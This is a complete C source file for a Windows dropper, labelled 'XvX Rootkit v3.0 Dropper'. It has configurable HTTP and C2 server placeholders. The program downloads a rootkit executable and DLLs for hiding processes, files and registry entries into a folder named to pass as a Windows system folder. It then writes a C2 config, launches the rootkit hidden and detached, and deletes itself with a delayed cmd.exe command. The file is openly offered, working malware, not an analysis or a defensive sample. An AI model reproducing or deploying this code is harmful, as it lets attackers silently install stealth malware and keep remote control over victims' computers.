#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

// TODO: Configure before deployment
const wchar_t *HTTP_SERVER = L"YOUR_HTTP_SERVER_IP";        // HTTP file server for downloads
const INTERNET_PORT HTTP_PORT = 8000;                         // HTTP port for file delivery
const wchar_t *C2_SERVER_URL = L"https://YOUR_C2_SERVER_IP:8443"; // HTTPS C2 for command & control

bool downloadFile(const wchar_t *server, const wchar_t *path, const wchar_t *outputPath)
{

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        HINTERNET hSession = WinHttpOpen(
            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
        if (!hSession)
        {
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            printf("[ERROR] WinHttpOpen failed after 3 attempts\n");
            return false;
        }

        DWORD timeout = 300000;
        WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
        WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

        // Connection
        HINTERNET hConnect = WinHttpConnect(hSession, server, 8000, 0);
        if (!hConnect)
        {
            printf("[ERROR] WinHttpConnect failed\n");
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        // Request
        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect, L"GET", path, NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hRequest)
        {
            printf("[ERROR] WinHttpOpenRequest failed\n");
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        // Send + Receive
        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        {
            printf("[ERROR] WinHttpSendRequest failed\n");
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL))
        {
            printf("[ERROR] WinHttpReceiveResponse failed\n");
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        DWORD statusCode = 0;
        DWORD statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
                            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            NULL, &statusCode, &statusSize, NULL);
        if (statusCode != 200)
        {
            printf("[ERROR] HTTP status != 200\n");
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        Sleep(500);

        if (GetFileAttributesW(outputPath) != INVALID_FILE_ATTRIBUTES)
        {

            if (!DeleteFileW(outputPath))
            {
                DWORD delError = GetLastError();
                printf("[WARN] DeleteFile failed (error=%lu) - file probably in use\n", delError);
                printf("[INFO] Attempting forced creation...\n");
            }
            else
            {
            }
            Sleep(100);
        }

        HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, FILE_SHARE_DELETE, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            DWORD createError = GetLastError();
            printf("[ERROR] CreateFile failed: %S (error=%lu)\n", outputPath, createError);
            if (createError == 3)
                printf("        -> ERROR_PATH_NOT_FOUND (parent directory missing)\n");
            if (createError == 5)
                printf("        -> ERROR_ACCESS_DENIED (insufficient permissions)\n");
            if (createError == 32)
            {
                printf("        -> ERROR_SHARING_VIOLATION (file locked - rootkit running?)\n");
                printf("        -> SOLUTION: Stop the svchost.exe process before retrying\n");
            }
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            if (attempt < 3)
            {
                Sleep(2000 * attempt);
                continue;
            }
            return false;
        }

        char buffer[32768];
        DWORD bytesRead = 0;
        DWORD bytesWritten = 0;
        DWORD totalBytes = 0;

        while (true)
        {
            if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead))
            {
                printf("[ERROR] WinHttpReadData failed\n");
                CloseHandle(hFile);
                DeleteFileW(outputPath);
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                break;
            }

            if (bytesRead == 0)
            {
                break;
            }

            if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL))
            {
                printf("[ERROR] WriteFile failed\n");
                CloseHandle(hFile);
                DeleteFileW(outputPath);
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                break;
            }

            totalBytes += bytesWritten;
            Sleep(5);
        }

        FlushFileBuffers(hFile);
        CloseHandle(hFile);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

        if (totalBytes > 0)
        {
            printf("[SUCCESS] Complete transfer: %lu KB\n", totalBytes / 1024);
            return true;
        }

        if (attempt < 3)
        {
            printf("[RETRY] Attempt %d failed, retrying in %d seconds...\n", attempt, 2 * attempt);
            Sleep(2000 * attempt);
        }
    }

    return false;
}

int main()
{
    printf("[+] XvX Rootkit v3.0 Dropper\n");
    printf("[+] HTTP Server: %S:8000\n", HTTP_SERVER);
    printf("[+] C2 Server: %S\n\n", C2_SERVER_URL);

    wchar_t appdata[MAX_PATH] = {0};
    HRESULT hr = SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    wchar_t installDir[MAX_PATH];
    swprintf(installDir, MAX_PATH, L"%ls\\Microsoft\\Windows\\SystemData", appdata);

    wchar_t parentDir[MAX_PATH];
    swprintf(parentDir, MAX_PATH, L"%ls\\Microsoft\\Windows", appdata);
    CreateDirectoryW(parentDir, NULL);

    BOOL dirCreated = CreateDirectoryW(installDir, NULL);
    DWORD dirError = GetLastError();

    DWORD attribs = GetFileAttributesW(installDir);
    if (attribs == INVALID_FILE_ATTRIBUTES)
    {
        printf("[ERROR] Folder inaccessible!\n");
    }
    else
    {
    }

    printf("[INFO] Installation folder: %S\n\n", installDir);

    printf("[1/4] Downloading rootkit.exe...\n");
    wchar_t rootkitPath[MAX_PATH];
    swprintf(rootkitPath, MAX_PATH, L"%ls\\rootkit.exe", installDir);

    if (!downloadFile(HTTP_SERVER, L"/rootkit.exe", rootkitPath))
    {
        printf("[FATAL] Failed to download rootkit after 3 attempts\n");
        return 1;
    }

    printf("[2/4] Downloading processHooks.dll...\n");
    wchar_t processHooksPath[MAX_PATH];
    swprintf(processHooksPath, MAX_PATH, L"%ls\\processHooks.dll", installDir);

    if (!downloadFile(HTTP_SERVER, L"/processHooks.dll", processHooksPath))
    {
        printf("[WARN] Failed to download processHooks.dll - process hiding disabled\n");
    }

    printf("[3/4] Downloading fileHooks.dll...\n");
    wchar_t fileHooksPath[MAX_PATH];
    swprintf(fileHooksPath, MAX_PATH, L"%ls\\fileHooks.dll", installDir);

    if (!downloadFile(HTTP_SERVER, L"/fileHooks.dll", fileHooksPath))
    {
        printf("[WARN] Failed to download fileHooks.dll - file hiding disabled\n");
    }

    printf("[4/4] Downloading registryHooks.dll...\n");
    wchar_t registryHooksPath[MAX_PATH];
    swprintf(registryHooksPath, MAX_PATH, L"%ls\\registryHooks.dll", installDir);

    if (!downloadFile(HTTP_SERVER, L"/registryHooks.dll", registryHooksPath))
    {
        printf("[WARN] Failed to download registryHooks.dll - registry hiding disabled\n");
    }
    printf("\n");

    printf("[CONFIG] Creating c2_config.txt...\n");
    wchar_t configPath[MAX_PATH];
    swprintf(configPath, MAX_PATH, L"%ls\\c2_config.txt", installDir);
    HANDLE hConfig = CreateFileW(configPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hConfig == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] Failed to create c2_config.txt (error=%lu)\n", GetLastError());
    }
    else
    {
        char c2urlA[256];
        WideCharToMultiByte(CP_UTF8, 0, C2_SERVER_URL, -1, c2urlA, sizeof(c2urlA), NULL, NULL);

        DWORD written;
        if (WriteFile(hConfig, c2urlA, (DWORD)strlen(c2urlA), &written, NULL))
        {
            printf("[CONFIG] c2_config.txt created: %s\n\n", c2urlA);
        }
        else
        {
            printf("[ERROR] Failed to write c2_config.txt (error=%lu)\n", GetLastError());
        }
        CloseHandle(hConfig);
    }

    printf("[LAUNCH] Starting rootkit...\n");
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(rootkitPath, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, installDir, &si, &pi))
    {
        printf("[SUCCESS] Rootkit launched (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        printf("[ERROR] Failed to launch rootkit\n");
        return 1;
    }

    printf("\n[+] Deployment complete - rootkit active\n");
    printf("[+] Removing dropper traces...\n");

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    wchar_t cmdLine[512];
    swprintf(cmdLine, 512, L"/C timeout /T 3 /NOBREAK > NUL & del /F /Q \"%s\"", selfPath);

    ShellExecuteW(NULL, L"open", L"cmd.exe", cmdLine, NULL, SW_HIDE);

    return 0;
}
